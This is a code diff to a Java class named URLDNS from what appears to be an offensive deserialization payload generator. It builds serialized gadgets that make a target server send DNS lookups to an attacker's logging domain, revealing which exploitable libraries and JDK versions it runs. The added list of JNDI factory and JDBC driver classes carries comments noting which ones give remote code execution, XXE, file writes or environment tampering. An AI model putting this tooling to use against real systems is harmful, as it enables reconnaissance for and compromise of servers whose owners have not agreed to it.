@@ -37,8 +37,85 @@ import java.util.List;
 @Authors({Authors.GEBL})
 public class URLDNS implements ObjectPayload<Object> {
     public static String[] defaultClass = new String[]{
-            "CommonsCollections13567", "CommonsCollections24", "CommonsBeanutils2", "C3P0", "AspectJWeaver", "bsh",
-            "Groovy", "Becl", "Jdk7u21", "JRE8u20", "winlinux", "jackson2100", "ROME", "SpringAOP"};
+            "CommonsCollections13567",
+            "CommonsCollections24",
+            "CommonsBeanutils2",
+            "C3P0",
+            "AspectJWeaver",
+            "bsh",
+            "Groovy",
+            "Becl",
+            "DefiningClassLoader",
+            "Jdk7u21",
+            "JRE8u20",
+            "ROME",
+            "Fastjson",
+            "Jackson",
+            "SpringAOP",
+            "winlinux",
+            "jdk17_22",
+            "jdk9_22",
+            "jdk6_8",
+            "jdk6_11",
+            "jdk9_10",
+    };
+
+    public static String[] jndidefaultclass = {
+            //"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",//知名getter=classloader,jdk默认就有
+
+            "org.apache.naming.factory.BeanFactory",//最经典的ObjectFactory,有它+低版本tomcat意味着可以执行单String方法
+            "org.apache.catalina.filters.CsrfPreventionFilter$NonceCache",//tomcat9.0.63/8.5.79高版本才有的类,有这个代表无法再用BeanFactory的forceString
+            "javax.el.ELProcessor",//和BeanFactory最经典的配合
+            //"groovy.lang.GroovyShell",//有Groovy所以可以省略了
+            //"groovy.lang.GroovyClassLoader",//有Groovy所以可以省略了
+            "org.yaml.snakeyaml.Yaml",//知名YAML序列化,可以跟BeanFactory配合
+            "com.thoughtworks.xstream.XStream",//知名XML序列化,可以跟BeanFactory配合
+            //"org.xmlpull.v1.XmlPullParserException",//XStream依赖
+            //"org.xmlpull.mxp1.MXParser",//XStream依赖
+            "org.mvel2.sh.ShellSession",//mvel语法,可以跟BeanFactory配合
+            //"com.sun.glass.utils.NativeLibLoader",//加载dll或者so,jdk默认就有
+
+            "org.apache.tomcat.jdbc.naming.GenericNamingResourcesFactory",//高版本tomcat和低版本tomcat没有forceString时的替代类,和BeanFactory一样只能调setter,但BeanFactory会检测setter所对应的属性
+            "org.apache.commons.configuration.SystemConfiguration",//配合GenericNamingResourcesFactory可以篡改jdk环境变量
+            "org.apache.commons.configuration2.SystemConfiguration",//配合GenericNamingResourcesFactory可以篡改jdk环境变量
+            "org.apache.groovy.util.SystemUtil",//groovy >= 3.0才有,配合GenericNamingResourcesFactory可以篡改jdk环境变量
+            "org.apache.batik.swing.JSVGCanvas",//远程加载svg造成XSS,XXE,RCE
+
+            "org.apache.catalina.users.MemoryUserDatabaseFactory",//配合UserDatabase可以XXE,写文件
+            "org.apache.catalina.UserDatabase",//配合MemoryUserDatabaseFactory可以XXE,写文件
+
+            "org.apache.tomcat.dbcp.dbcp.BasicDataSourceFactory",//以下均为DataSourceFactory,可以造成jdbc
+            "org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory",
+            "org.apache.commons.dbcp.BasicDataSourceFactory",
+            //"org.apache.commons.pool.KeyedObjectPoolFactory",//commons-dbcp1依赖
+            "org.apache.commons.dbcp2.BasicDataSourceFactory",
+            //"org.apache.commons.pool2.PooledObjectFactory",//commons-dbcp2依赖
+            "org.apache.tomcat.jdbc.pool.DataSourceFactory",
+            //"org.apache.juli.logging.LogFactory",//tomcat-jdbc依赖
+            "com.alibaba.druid.pool.DruidDataSourceFactory",
+            "com.zaxxer.hikari.HikariJNDIFactory",
+            //"org.slf4j.LoggerFactory",//HikariCP依赖
+            "org.h2.Driver",//h2 jdbc,可以RCE
+            "org.postgresql.Driver",//postgresql,可以远程加载XML执行SPEL,可以写文件
+            "org.springframework.context.support.ClassPathXmlApplicationContext",//postgresql RCE依赖spring环境
+            "com.mysql.jdbc.Driver",//mysql,可以二次反序列化,可以读文件,可以XXE
+            "com.mysql.cj.jdbc.Driver",
+            "com.mysql.fabric.jdbc.FabricMySQLDriver",
+            "oracle.jdbc.driver.OracleDriver",//oracle,可以带出机器用户名
+            "com.ibm.db2.jcc.DB2Driver",//db2,可以写文件
+            "COM.ibm.db2.jcc.DB2Driver",
+
+            "com.ibm.ws.webservices.engine.client.ServiceFactory",//WebSphere的ObjectFactory,可以远程加载jar,很少用到
+            "com.ibm.ws.client.applicationclient.ClientJ2CCFFactory",
+
+
+            "oracle.ucp.jdbc.PoolDataSourceImpl",//反序列化转getter(getConnection)转jdbc(h2)转所需要的DataSource中转类,weblogic依赖
+            //"com.mchange.v2.c3p0.DriverManagerDataSource",//有C3P0所以可以省略了
+            //"com.mchange.v2.c3p0.test.FreezableDriverManagerDataSource",//有C3P0所以可以省略了
+            //"com.alibaba.druid.pool.xa.DruidXADataSource",//有com.alibaba.druid.pool.DruidDataSourceFactory所以可以省略了
+            "org.hibernate.service.jdbc.connections.internal.DriverManagerConnectionProviderImpl",//hibernate-core-4.x,比较低版本才有的类
+
+    };
 
     public static List<Object> list = new LinkedList();
 
@@ -135,22 +212,6 @@ public class URLDNS implements ObjectPayload<Object> {
                 Object JRE8u20 = getURLDNSGadget("JRE8u20." + dnsLog, "javax.swing.plaf.metal.MetalFileChooserUI$DirectoryComboBoxModel$1");
                 list.add(JRE8u20);
                 break;
-            case "winlinux":
-                //windows/linux版本判断
-                Object linux = getURLDNSGadget("linux." + dnsLog, "sun.awt.X11.AwtGraphicsConfigData");
-                Object windows = getURLDNSGadget("windows." + dnsLog, "sun.awt.windows.WButtonPeer");
-                list.add(linux);
-                list.add(windows);
-                break;
-            case "jackson2100":
-                //jackson-databind>=2.10.0存在一个链
-                Object jackson2100 = getURLDNSGadget("jackson2100." + dnsLog, "com.fasterxml.jackson.databind.node.NodeSerialization");
-                list.add(jackson2100);
-                break;
-            case "fastjson":
-                Object fastjson = getURLDNSGadget("fastjson." + dnsLog, "com.alibaba.fastjson.JSONArray");
-                list.add(fastjson);
-                break;
             case "ROME":
                 //rome <= 1.11.1
                 Object rome1000 = getURLDNSGadget("rome1000." + dnsLog, "com.sun.syndication.feed.impl.ToStringBean");
@@ -158,14 +219,57 @@ public class URLDNS implements ObjectPayload<Object> {
                 list.add(rome1000);
                 list.add(rome1111);
                 break;
+            case "Fastjson":
+                Object fastjson = getURLDNSGadget("fastjson." + dnsLog, "com.alibaba.fastjson.JSONArray");
+                list.add(fastjson);
+                break;
+            case "Jackson":
+                //jackson-databind>=2.10.0存在一个链
+                //此链实战中有50%概率触发getStylesheetDOM导致不成功,因此需要org.springframework.aop.framework.JdkDynamicAopProxy封装,这个类的jar包和springAOP一样
+                Object jackson2100 = getURLDNSGadget("jackson2100." + dnsLog, "com.fasterxml.jackson.databind.node.NodeSerialization");
+                list.add(jackson2100);
+                break;
             case "SpringAOP":
-                //fastjon/jackson两个链的变种都需要springAOP
+                //fastjon/jackson两个链触发toString的变种,都需要springAOP
                 Object springAOP = getURLDNSGadget("SpringAOP." + dnsLog, "org.springframework.aop.target.HotSwappableTargetSource.HotSwappableTargetSource");
                 list.add(springAOP);
                 break;
+            case "winlinux":
+                //windows/linux版本判断
+                Object linux = getURLDNSGadget("linux." + dnsLog, "sun.awt.X11.AwtGraphicsConfigData");
+                Object windows = getURLDNSGadget("windows." + dnsLog, "sun.awt.windows.WButtonPeer");
+                list.add(linux);
+                list.add(windows);
+                break;
+            case "jdk17_22":
+                Object jdk17_22 = getURLDNSGadget("jdk17_22." + dnsLog, "jdk.internal.util.random.RandomSupport");
+                list.add(jdk17_22);
+                break;
+            case "jdk9_22":
+                Object jdk9_22 = getURLDNSGadget("jdk9_22." + dnsLog, "jdk.internal.misc.Unsafe");
+                list.add(jdk9_22);
+                break;
+            case "jdk6_8":
+                Object jdk6_8 = getURLDNSGadget("jdk6_8." + dnsLog, "sun.misc.BASE64Decoder");
+                list.add(jdk6_8);
+                break;
+            case "jdk6_11":
+                Object jdk6_11 = getURLDNSGadget("jdk6_11." + dnsLog, "com.sun.awt.SecurityWarning");
+                list.add(jdk6_11);
+                break;
+            case "jdk9_10":
+                Object jdk9_10 = getURLDNSGadget("jdk9_10." + dnsLog, "jdk.incubator.http.HttpClient");
+                list.add(jdk9_10);
+                break;
+
             case "all":
                 for (int i = 0; i < defaultClass.length; i++) {
                     setList(defaultClass[i], dnsLog);
+                }
+                break;
+            case "jndiall":
+                for (int i = 0; i < jndidefaultclass.length; i++) {
+                    setList(jndidefaultclass[i], dnsLog);
                 }
                 break;
             default:
@@ -198,6 +302,11 @@ public class URLDNS implements ObjectPayload<Object> {
             // all 会测试全部类
             case "all":
                 setList("all", url);
+                break;
+
+            // jndi 时会测试JNDI相关的类
+            case "jndiall":
+                setList("jndiall", url);
                 break;
 
             case "null":
